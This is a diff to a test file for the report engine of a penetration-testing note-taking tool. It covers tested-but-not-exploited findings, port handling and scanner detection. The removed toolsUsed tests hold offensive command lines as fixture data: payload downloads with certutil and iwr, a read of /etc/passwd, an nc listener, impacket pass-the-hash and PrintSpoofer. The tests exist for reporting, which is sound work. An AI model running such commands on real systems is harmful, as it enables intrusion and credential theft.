@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { attackChain, exploitedSystems, msfModules, serviceCoverage, testedNotExploited, toolsUsed } from "../engines/report";
+import { attackChain, isPortScan, msfModules, serviceCoverage, testedLine, testedNotExploited } from "../engines/report";
 import type { ReportData } from "../engines/report";
 import type { Host } from "../types/host";
 import type { LogEntry } from "../types/log";
@@ -55,30 +55,28 @@ describe("testedNotExploited", () => {
     const d = data();
     d.ruledOut = [{ id: "r", hostId: H, text: "FTP anon", reason: "disabled", private: false }] as never;
     expect(testedNotExploited(d, H)).toEqual([
-      { title: "SSH brute force on 22", reason: "blocked by a control: WAF drops it" },
-      { title: "scan 10.0.22.5 sweep", reason: "blocked by a control" },
-      { title: "FTP anon", reason: "disabled" },
+      { title: "SSH brute force on 22", reason: "blocked by a control: WAF drops it", port: null },
+      { title: "scan 10.0.22.5 sweep", reason: "blocked by a control", port: null },
+      { title: "FTP anon", reason: "disabled", port: null },
     ]);
     expect(testedNotExploited(d, null)).toEqual([]);
+  });
 
+  it("knows the port from the attempt's finding or the dead-end service", () => {
+    const d = data();
+    d.attempts = [attempt("Apache path traversal", { reason: "patched", findingId: "f1" })] as never;
+    d.ruledOut = [{ id: "r", hostId: H, text: "SMB", reason: "signing required", private: false, sourceKind: "service", sourceId: "s445" }] as never;
+    expect(testedNotExploited(d, H).map((r) => r.port)).toEqual([80, 445]);
   });
 });
 
-describe("exploitedSystems", () => {
-  it("prefers the section method over the finding title", () => {
-    const t = [{ key: H, kind: "standalone" as const, hostIds: [H] }];
-    expect(exploitedSystems(data(), t, {})[0]).toMatchObject({ name: "web01", access: "root", method: "RCE in app" });
-    expect(exploitedSystems(data(), t, { [H]: { method: "Manual" } })[0].method).toBe("Manual");
-  });
-  it("words full access as SYSTEM on Windows and root elsewhere", () => {
-    const d = data();
-    d.hosts = [{ id: H, name: "web01", ip: "10.0.0.5", access: "root", os: "windows" }] as never;
-    const t = [{ key: H, kind: "standalone" as const, hostIds: [H] }];
-    expect(exploitedSystems(d, t, {})[0].access).toBe("SYSTEM");
-  });
-  it("lists only hosts where access was gained", () => {
-    const t = [{ key: "ad-set", kind: "ad-set" as const, hostIds: [H, "h2"] }];
-    expect(exploitedSystems(data(), t, {}).map((r) => r.name)).toEqual(["web01"]);
+describe("testedLine", () => {
+  it("reads <what> on <port>: <reason>, the port only when the title doesn't name it", () => {
+    expect(testedLine({ title: "Apache path traversal", reason: "precondition not met: patched", port: 80 })).toBe(
+      "Apache path traversal on 80: precondition not met: patched",
+    );
+    expect(testedLine({ title: "SSH brute force on 22", reason: "no access", port: 22 })).toBe("SSH brute force on 22: no access");
+    expect(testedLine({ title: "FTP anonymous login", reason: "", port: null })).toBe("FTP anonymous login");
   });
 });
 
@@ -103,70 +101,13 @@ describe("attackChain", () => {
 const entry = (id: string, command: string, extra: Partial<LogEntry> = {}) =>
   ({ id, kind: "command", hostIds: [H], private: false, content: { kind: "command", blocks: [{ command, output: "" }] }, ...extra }) as LogEntry;
 
-describe("toolsUsed", () => {
-  it("lists each tool once with its purpose and URL, skipping sudo and private entries", () => {
-    const log = [
-      entry("a", "nmap -sV 10.0.0.5"),
-      entry("b", "sudo nmap -p- 10.0.0.5\nFOO=1 gobuster dir"),
-      entry("c", "hydra x", { private: true }),
-    ];
-    expect(toolsUsed(log, [H])).toEqual([
-      { tool: "gobuster", purpose: "Web content discovery", url: "https://github.com/OJ/gobuster" },
-      { tool: "nmap", purpose: "Port and service scanning", url: "https://nmap.org" },
-    ]);
-  });
-  it("leaves out shell builtins and coreutils, including sudo -l and every segment of a chain", () => {
-    const log = [
-      entry("a", "whoami /priv\ntype C:\\x.txt\ncd /tmp && ls -la\ncat /etc/passwd | grep root\nsudo -l\nsudo tar -cf x y\nchmod 600 k && ssh -i k dev@10.0.0.5"),
-      entry("b", "iwr http://x/a.exe -OutFile a.exe\nInvoke-WebRequest http://x/b\necho hi\ncp a b\nmv a b\ndir"),
-      entry("c", "certutil -urlcache -f http://x/a.exe a.exe"),
-    ];
-    expect(toolsUsed(log, [H]).map((r) => [r.tool, r.purpose])).toEqual([
-      ["certutil", "File transfer"],
-      ["ssh", "Remote shell over SSH"],
-    ]);
-  });
-  it("names a tool's family once (winPEAS, PrintSpoofer, impacket) and keeps unknown tools with blank purpose", () => {
-    const log = [
-      entry("a", ".\\winPEASx64.exe quiet\nC:\\Windows\\Tasks\\PrintSpoofer64.exe -i -c cmd\nPrintSpoofer.exe -i"),
-      entry("b", "impacket-psexec a@b -hashes :x\nimpacket-GetUserSPNs a/b -request\nrlwrap nc -lvnp 443\nmytool --go"),
-    ];
-    expect(toolsUsed(log, [H]).map((r) => r.tool)).toEqual([
-      "impacket-GetUserSPNs",
-      "impacket-psexec",
-      "mytool",
-      "nc",
-      "PrintSpoofer",
-      "rlwrap",
-      "winPEAS",
-    ]);
-    expect(toolsUsed(log, [H]).find((r) => r.tool === "mytool")).toEqual({ tool: "mytool", purpose: "", url: "" });
-  });
-  it("counts python3 only when it runs a .py file, as the exploit runner, however the script is started", () => {
-    expect(toolsUsed([entry("a", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -m http.server 80\npython -m venv x")], [H])).toEqual([]);
-    expect(toolsUsed([entry("a", "python3 46153.py -u admin -i http://x")], [H]).map((r) => [r.tool, r.purpose])).toEqual([["python3", "Exploit runner"]]);
-    expect(toolsUsed([entry("a", "./46153.py -u admin\n/opt/x/exploit.py")], [H]).map((r) => [r.tool, r.purpose])).toEqual([["python3", "Exploit runner"]]);
-    expect(toolsUsed([entry("a", "psexec.py a@b")], [H]).map((r) => r.tool)).toEqual(["impacket-psexec"]);
-  });
-  it("leaves out git and ssh-keygen and names msfconsole", () => {
-    expect(toolsUsed([entry("a", "git clone https://x/y\nssh-keygen -t ed25519\nmsfconsole -q")], [H])).toEqual([
-      { tool: "msfconsole", purpose: "Metasploit console", url: "https://github.com/rapid7/metasploit-framework" },
-    ]);
-  });
-  it("a cleared override field falls back to the catalog", () => {
-    expect(toolsUsed([entry("a", "nmap x")], [H], { overrides: { nmap: { purpose: "", url: "https://x" } } })).toEqual([
-      { tool: "nmap", purpose: "Port and service scanning", url: "https://x" },
-    ]);
-  });
-  it("leaves out entries an operator or private attempt points at, and applies per-row overrides", () => {
-    const log = [entry("a", "PrintSpoofer32.exe -i"), entry("b", "hydra -l sa x")];
-    const attempts = [{ id: "t", hostId: H, reasonKind: "operator", private: true, logEntryId: "a" }] as never;
-    expect(toolsUsed(log, [H], { attempts, overrides: { hydra: { purpose: "MSSQL password guessing" } } })).toEqual([
-      { tool: "hydra", purpose: "MSSQL password guessing", url: "https://github.com/vanhauser-thc/thc-hydra" },
-    ]);
-  });
-  it("has no banned tools in its catalog", () => {
-    expect(toolsUsed([entry("a", "sqlmap -u x\nnessus\nopenvas")], [H]).every((r) => r.purpose === "")).toBe(true);
+describe("isPortScan", () => {
+  it("finds a port scanner in any block, behind sudo or after a separator", () => {
+    expect(isPortScan(entry("a", "nmap -sV 10.0.0.5"))).toBe(true);
+    expect(isPortScan(entry("b", "sudo rustscan -a 10.0.0.5"))).toBe(true);
+    expect(isPortScan(entry("c", "cd /tmp && masscan -p1-65535 10.0.0.5"))).toBe(true);
+    expect(isPortScan(entry("d", "smbclient -L //10.0.0.5"))).toBe(false);
+    expect(isPortScan({ ...entry("e", ""), content: { kind: "note", text: "nmap" } } as LogEntry)).toBe(false);
   });
 });
 
